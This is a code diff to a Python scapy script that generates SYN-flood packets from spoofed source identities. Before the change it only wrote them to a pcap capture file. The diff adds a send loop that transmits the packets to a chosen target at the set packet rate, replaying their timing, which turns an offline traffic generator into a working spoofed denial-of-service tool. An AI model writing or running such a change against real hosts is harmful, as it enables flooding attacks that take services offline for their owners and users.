@@ -2,8 +2,9 @@ import argparse
 import ipaddress
 import math
 import random
+import time
 
-from scapy.all import IP, TCP, wrpcap
+from scapy.all import IP, TCP, send, wrpcap
 
 
 PROFILES = {
@@ -26,7 +27,7 @@ DEFAULTS = {
     "burst_gap": 0.0,
     "seed": None,
     "profile": None,
-    "output": "data/raw/syn_flood_candidate.pcap",
+    "output": "/pcaps/syn_flood_candidate.pcap",
 }
 
 
@@ -149,9 +150,15 @@ def main():
         burst_gap=args.burst_gap,
         rng=rng,
     )
-    print(f"Generating SYN flood to {args.target}:{','.join(map(str, args.target_ports))} at {args.pps} PPS for {args.duration:g} seconds.")
+    print(f"Sending SYN flood to {args.target}:{','.join(map(str, args.target_ports))} at {args.pps} PPS for {args.duration:g} seconds.")
+    for index, packet in enumerate(packets):
+        send(packet, verbose=False)
+        if index + 1 < len(packets):
+            pause = max(0.0, float(packets[index + 1].time) - float(packet.time))
+            if pause:
+                time.sleep(pause)
     wrpcap(args.output, packets)
-    print(f"Completed SYN flood generation. Wrote {len(packets)} packets across {len(spoof_pool)} spoofed identities to {args.output}.")
+    print(f"Completed SYN flood. Sent {len(packets)} packets across {len(spoof_pool)} spoofed identities; wrote pcap to {args.output}.")
 
 
 if __name__ == "__main__":
